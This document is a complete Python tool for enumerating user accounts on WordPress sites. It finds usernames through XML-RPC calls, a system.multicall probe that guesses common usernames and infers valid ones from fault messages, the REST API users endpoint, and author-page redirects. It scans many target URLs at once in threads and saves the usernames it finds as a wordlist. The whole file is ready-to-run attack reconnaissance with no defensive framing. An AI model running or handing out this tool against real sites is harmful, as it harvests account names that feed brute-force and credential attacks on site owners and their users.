#!/usr/bin/env python3
"""
WordPress XML-RPC User Enumeration Tool
Enumerates users via multiple XML-RPC methods and REST API fallback.
Usage: python3 wp_xmlrpc_enum.py -f urls.txt
       python3 wp_xmlrpc_enum.py -u https://target.com
"""

import argparse
import requests
import xml.etree.ElementTree as ET
import json
import sys
import time
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

requests.packages.urllib3.disable_warnings()

BANNER = r"""
╔══════════════════════════════════════════════════════════╗
║        WordPress XML-RPC User Enumerator                 ║      
╚══════════════════════════════════════════════════════════╝
"""

HEADERS = {
    "Content-Type": "text/xml",
    "User-Agent": "Mozilla/5.0 (compatible; WPEnumBot/1.0)"
}

# ─── XML-RPC Payloads ────────────────────────────────────────────────────────

def payload_list_methods():
    return """<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>"""

def payload_get_users_blogs(username, password):
    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""

def payload_get_authors(username, password, blog_id=1):
    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getAuthors</methodName>
  <params>
    <param><value><int>{blog_id}</int></value></param>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""

def payload_get_users(username, password, blog_id=1):
    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsers</methodName>
  <params>
    <param><value><int>{blog_id}</int></value></param>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""

def payload_multicall_usercheck(usernames):
    """Build a multicall payload to check multiple usernames in one request."""
    calls = ""
    for uname in usernames:
        calls += f"""
      <value><struct>
        <member>
          <name>methodName</name>
          <value><string>wp.getUsersBlogs</string></value>
        </member>
        <member>
          <name>params</name>
          <value><array><data>
            <value><string>{uname}</string></value>
            <value><string>invalidpassword123!</string></value>
          </data></array></value>
        </member>
      </struct></value>"""

    return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param><value><array><data>
{calls}
    </data></array></value></param>
  </params>
</methodCall>"""

# ─── XML-RPC Response Parsers ────────────────────────────────────────────────

def parse_methods(response_text):
    """Extract available methods from system.listMethods response."""
    try:
        root = ET.fromstring(response_text)
        methods = [v.text for v in root.iter('string') if v.text]
        return methods
    except ET.ParseError:
        return []

def parse_fault(response_text):
    """Return fault code and message if response is a fault."""
    try:
        root = ET.fromstring(response_text)
        fault = root.find('.//fault')
        if fault is not None:
            members = {m.find('name').text: m.find('value') for m in fault.iter('member')}
            code = members.get('faultCode')
            msg  = members.get('faultString')
            code_val = code.find('int').text if code is not None else '?'
            msg_val  = msg.find('string').text if msg is not None else '?'
            return int(code_val), msg_val
    except Exception:
        pass
    return None, None

def parse_authors(response_text):
    """Parse wp.getAuthors response into list of dicts."""
    users = []
    try:
        root = ET.fromstring(response_text)
        for struct in root.iter('struct'):
            user = {}
            for member in struct.findall('member'):
                name = member.find('name').text
                value_el = member.find('value')
                if value_el is not None:
                    val = value_el.find('string')
                    if val is None:
                        val = value_el.find('int')
                    user[name] = val.text if val is not None else ''
            if 'user_login' in user or 'display_name' in user:
                users.append(user)
    except ET.ParseError:
        pass
    return users

def parse_multicall_response(response_text):
    """
    Infer valid usernames from multicall responses.
    Wrong password → faultCode 403 = username EXISTS
    Wrong username → faultCode 403 with different message OR different code
    """
    results = []
    try:
        root = ET.fromstring(response_text)
        for i, val in enumerate(root.iter('value')):
            fault = val.find('.//fault')
            if fault is not None:
                members = {m.find('name').text: m.find('value') for m in fault.iter('member')}
                code_el = members.get('faultCode')
                msg_el  = members.get('faultString')
                code = int(code_el.find('int').text) if code_el is not None else 0
                msg  = msg_el.find('string').text if msg_el is not None else ''
                results.append({'index': i, 'fault_code': code, 'message': msg})
    except ET.ParseError:
        pass
    return results

# ─── REST API Fallback ───────────────────────────────────────────────────────

def rest_api_enum(base_url, session):
    """Enumerate users via WordPress REST API /wp-json/wp/v2/users."""
    users = []
    endpoints = [
        f"{base_url}/wp-json/wp/v2/users",
        f"{base_url}/?rest_route=/wp/v2/users"
    ]
    for ep in endpoints:
        try:
            r = session.get(ep, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                for u in data:
                    users.append({
                        'user_login': u.get('slug', ''),
                        'display_name': u.get('name', ''),
                        'user_id': str(u.get('id', '')),
                        'source': 'REST API'
                    })
                if users:
                    break
        except Exception:
            pass
    return users

# ─── Author Page Enumeration ─────────────────────────────────────────────────

def author_page_enum(base_url, session, max_id=10):
    """Enumerate usernames via /?author=N redirect."""
    users = []
    for i in range(1, max_id + 1):
        try:
            r = session.get(f"{base_url}/?author={i}", timeout=10,
                            verify=False, allow_redirects=True)
            if r.status_code == 200 and '/author/' in r.url:
                slug = r.url.split('/author/')[1].strip('/')
                if slug:
                    users.append({
                        'user_login': slug,
                        'display_name': slug,
                        'user_id': str(i),
                        'source': 'Author Page'
                    })
        except Exception:
            pass
    return users

# ─── Core Enumeration Logic ──────────────────────────────────────────────────

def enumerate_target(url, timeout=15, verbose=False):
    """Run all enumeration methods against a single target URL."""
    results = {
        'url': url,
        'xmlrpc_enabled': False,
        'available_methods': [],
        'users': [],
        'errors': [],
        'methods_tried': []
    }

    # Normalize URL
    if not url.startswith('http'):
        url = 'https://' + url
    base_url = url.rstrip('/')
    xmlrpc_url = base_url + '/xmlrpc.php'

    session = requests.Session()
    session.verify = False
    session.headers.update(HEADERS)

    # ── Step 1: Check XML-RPC availability ──
    results['methods_tried'].append('XML-RPC Availability Check')
    try:
        r = session.post(xmlrpc_url,
                         data=payload_list_methods(),
                         timeout=timeout)
        if r.status_code == 200 and 'methodResponse' in r.text:
            results['xmlrpc_enabled'] = True
            methods = parse_methods(r.text)
            results['available_methods'] = methods
            if verbose:
                print(f"  [+] XML-RPC enabled. {len(methods)} methods available.")
        else:
            results['errors'].append(f"XML-RPC check returned HTTP {r.status_code}")
            if verbose:
                print(f"  [-] XML-RPC not responding as expected (HTTP {r.status_code})")
    except requests.RequestException as e:
        results['errors'].append(f"XML-RPC connection error: {e}")
        if verbose:
            print(f"  [!] Connection error: {e}")

    # ── Step 2: wp.getAuthors (requires valid creds but reveals usernames in error) ──
    if results['xmlrpc_enabled']:
        results['methods_tried'].append('wp.getAuthors')
        try:
            r = session.post(xmlrpc_url,
                             data=payload_get_authors('admin', 'invalidpass'),
                             timeout=timeout)
            users = parse_authors(r.text)
            if users:
                for u in users:
                    u['source'] = 'wp.getAuthors'
                results['users'].extend(users)
                if verbose:
                    print(f"  [+] wp.getAuthors returned {len(users)} user(s)")
            else:
                code, msg = parse_fault(r.text)
                if verbose:
                    print(f"  [-] wp.getAuthors fault {code}: {msg}")
        except requests.RequestException as e:
            results['errors'].append(f"wp.getAuthors error: {e}")

    # ── Step 3: wp.getUsers ──
    if results['xmlrpc_enabled'] and 'wp.getUsers' in results['available_methods']:
        results['methods_tried'].append('wp.getUsers')
        try:
            r = session.post(xmlrpc_url,
                             data=payload_get_users('admin', 'invalidpass'),
                             timeout=timeout)
            users = parse_authors(r.text)  # same struct format
            if users:
                for u in users:
                    u['source'] = 'wp.getUsers'
                results['users'].extend(users)
                if verbose:
                    print(f"  [+] wp.getUsers returned {len(users)} user(s)")
        except requests.RequestException as e:
            results['errors'].append(f"wp.getUsers error: {e}")

    # ── Step 4: system.multicall username inference ──
    if results['xmlrpc_enabled']:
        results['methods_tried'].append('system.multicall (username inference)')
        common_usernames = [
            'admin', 'administrator', 'editor', 'author', 'webmaster',
            'root', 'user', 'test', 'demo', 'wordpress', 'support', 'info'
        ]
        try:
            r = session.post(xmlrpc_url,
                             data=payload_multicall_usercheck(common_usernames),
                             timeout=timeout)
            multicall_results = parse_multicall_response(r.text)
            for res in multicall_results:
                # faultCode 403 + "incorrect password" = username exists
                if res['fault_code'] == 403 and 'incorrect' in res['message'].lower():
                    uname = common_usernames[res['index']]
                    results['users'].append({
                        'user_login': uname,
                        'display_name': uname,
                        'user_id': '?',
                        'source': 'multicall inference'
                    })
                    if verbose:
                        print(f"  [+] Valid username inferred: {uname}")
        except requests.RequestException as e:
            results['errors'].append(f"multicall error: {e}")

    # ── Step 5: REST API ──
    results['methods_tried'].append('REST API /wp-json/wp/v2/users')
    rest_users = rest_api_enum(base_url, session)
    if rest_users:
        results['users'].extend(rest_users)
        if verbose:
            print(f"  [+] REST API returned {len(rest_users)} user(s)")
    elif verbose:
        print(f"  [-] REST API returned no users")

    # ── Step 6: Author page enumeration ──
    results['methods_tried'].append('Author Page /?author=N')
    author_users = author_page_enum(base_url, session)
    if author_users:
        results['users'].extend(author_users)
        if verbose:
            print(f"  [+] Author pages found {len(author_users)} user(s)")
    elif verbose:
        print(f"  [-] Author page enumeration found nothing")

    # Deduplicate users by login
    seen = set()
    unique_users = []
    for u in results['users']:
        key = u.get('user_login', '').lower()
        if key and key not in seen:
            seen.add(key)
            unique_users.append(u)
    results['users'] = unique_users

    return results

# ─── Output Formatting ───────────────────────────────────────────────────────

def print_results(result):
    url = result['url']
    users = result['users']
    print(f"\n{'═'*60}")
    print(f"  TARGET : {url}")
    print(f"  XML-RPC: {'ENABLED ✓' if result['xmlrpc_enabled'] else 'DISABLED ✗'}")
    print(f"  METHODS: {len(result['available_methods'])} available")
    print(f"{'─'*60}")

    if users:
        print(f"  USERS FOUND ({len(users)}):")
        for u in users:
            login   = u.get('user_login', 'N/A')
            display = u.get('display_name', 'N/A')
            uid     = u.get('user_id', '?')
            source  = u.get('source', '?')
            print(f"    [+] {login:<20} | Display: {display:<20} | ID: {uid:<4} | via: {source}")
    else:
        print("  NO USERS FOUND")

    if result['errors']:
        print(f"{'─'*60}")
        print("  ERRORS:")
        for e in result['errors']:
            print(f"    [!] {e}")
    print(f"{'═'*60}")

def save_report(all_results, output_file):
    """Save JSON report."""
    report = {
        'generated': datetime.now().isoformat(),
        'total_targets': len(all_results),
        'results': all_results
    }
    with open(output_file, 'w') as f:
        json.dump(report, f, indent=2)
    print(f"\n[+] Report saved to: {output_file}")

def save_userlist(all_results, output_file):
    """Save plain text list of found users."""
    with open(output_file, 'w') as f:
        for r in all_results:
            if r['users']:
                f.write(f"# {r['url']}\n")
                for u in r['users']:
                    f.write(f"{u.get('user_login', '')}\n")
                f.write("\n")
    print(f"[+] User list saved to: {output_file}")

# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description='WordPress XML-RPC User Enumerator',
        formatter_class=argparse.RawTextHelpFormatter
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url',  help='Single target URL')
    group.add_argument('-f', '--file', help='File containing list of URLs (one per line)')

    parser.add_argument('-t', '--threads',  type=int, default=5,
                        help='Number of threads for multi-target scanning (default: 5)')
    parser.add_argument('-T', '--timeout',  type=int, default=15,
                        help='Request timeout in seconds (default: 15)')
    parser.add_argument('-o', '--output',   help='Save JSON report to file')
    parser.add_argument('-w', '--wordlist', help='Save found usernames to file')
    parser.add_argument('-v', '--verbose',  action='store_true',
                        help='Verbose output')
    parser.add_argument('--delay',          type=float, default=0,
                        help='Delay in seconds between requests (default: 0)')

    args = parser.parse_args()

    # Build URL list
    urls = []
    if args.url:
        urls = [args.url.strip()]
    else:
        try:
            with open(args.file) as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            print(f"[!] File not found: {args.file}")
            sys.exit(1)

    print(f"[*] Targets loaded  : {len(urls)}")
    print(f"[*] Threads         : {args.threads}")
    print(f"[*] Timeout         : {args.timeout}s")
    print(f"[*] Started         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    all_results = []

    if len(urls) == 1 or args.threads == 1:
        for url in urls:
            print(f"\n[*] Scanning: {url}")
            result = enumerate_target(url, timeout=args.timeout, verbose=args.verbose)
            print_results(result)
            all_results.append(result)
            if args.delay:
                time.sleep(args.delay)
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(enumerate_target, url, args.timeout, args.verbose): url
                for url in urls
            }
            for future in as_completed(futures):
                url = futures[future]
                try:
                    result = future.result()
                    print_results(result)
                    all_results.append(result)
                except Exception as e:
                    print(f"[!] Error scanning {url}: {e}")
                if args.delay:
                    time.sleep(args.delay)

    # Summary
    total_users = sum(len(r['users']) for r in all_results)
    xmlrpc_enabled = sum(1 for r in all_results if r['xmlrpc_enabled'])
    print(f"\n{'═'*60}")
    print(f"  SCAN COMPLETE")
    print(f"  Targets scanned  : {len(all_results)}")
    print(f"  XML-RPC enabled  : {xmlrpc_enabled}")
    print(f"  Total users found: {total_users}")
    print(f"{'═'*60}")

    # Save outputs
    if args.output:
        save_report(all_results, args.output)
    if args.wordlist:
        save_userlist(all_results, args.wordlist)

if __name__ == '__main__':
    main()
